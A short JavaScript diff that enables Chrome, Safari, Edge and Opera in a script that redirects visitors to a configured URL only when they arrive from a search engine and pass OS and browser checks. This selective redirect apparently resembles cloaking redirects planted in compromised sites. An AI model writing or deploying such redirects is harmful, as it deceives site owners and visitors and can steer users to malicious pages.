@@ -23,11 +23,11 @@
             },
 
             browser: {
-                chrome: false,
+                chrome: true,
                 firefox: false,
-                safari: false,
-                edge: false,
-                opera: false
+                safari: true,
+                edge: true,
+                opera: true
             }
         }
     };
@@ -67,4 +67,5 @@
     if (isFromSearchEngine && finalOsCheck && finalBrowserCheck) {
         window.location.href = config.redirectUrl;
     }
+
 })();
